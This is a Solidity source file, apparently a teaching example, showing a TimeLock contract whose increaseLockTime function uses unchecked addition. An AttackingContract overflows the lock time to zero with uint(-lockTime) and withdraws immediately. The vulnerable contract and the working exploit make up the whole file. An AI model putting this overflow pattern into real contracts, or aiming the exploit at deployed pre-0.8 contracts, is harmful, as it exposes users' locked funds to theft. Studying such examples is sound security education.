pragma solidity ^0.6.6;

// Here we are using uint overflow to bypass the lock time
// of funds deposited in a contract.

// eth deposited on this contract are locked for a period of time
contract TimeLock {
    // amount of eth deposited by the user
    mapping(address => uint) public balances;

    // time at which the user can withdraw his funds
    mapping(address => uint) public lockTime;

    // deposit eth and lock the funds for 1 week
    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = now + 1 weeks;
    }

    // increase the lock time by x seconds
    function increaseLockTime(uint _secondToIncrease) public {
        lockTime[msg.sender] += _secondToIncrease;
    }

    // withdraw the funds deposited
    function withdraw() public {
        // ensure the caller has funds to withdraw
        require(balances[msg.sender] > 0, "Insufficient funds");
        // ensure the lock time has expired
        require(now > lockTime[msg.sender], "Lock time not expired");
        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Failed to send eth");
    }
}

contract AttackingContract {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) public {
        timeLock = _timeLock;
    }

    fallback() external payable {}

    function attack() public payable {
        timeLock.deposit{value: msg.value}();
        // set the lock time to 0
        timeLock.increaseLockTime(
            // t == current lock time
            // find x such that 
            // x + t = 2**256
            // x = 2**256 - t
            uint(-timeLock.lockTime(address(this)))
        );
        timeLock.withdraw();
    }
}